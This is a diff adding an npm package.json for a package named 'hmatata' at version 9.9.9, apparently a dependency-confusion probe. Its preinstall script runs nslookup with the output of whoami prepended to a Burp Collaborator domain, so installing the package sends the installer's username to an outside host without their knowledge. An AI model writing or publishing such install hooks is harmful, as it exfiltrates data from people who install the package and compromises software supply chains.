@@ -1,0 +1,12 @@
+{
+  "name": "hmatata",
+  "version": "9.9.9",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "",
+    "preinstall":"nslookup `whoami`.jh4rtos79uddxf5jk0vd8apc93fv3k.burpcollaborator.net"
+  },
+  "author": "ba",
+  "license": "ISC"
+}
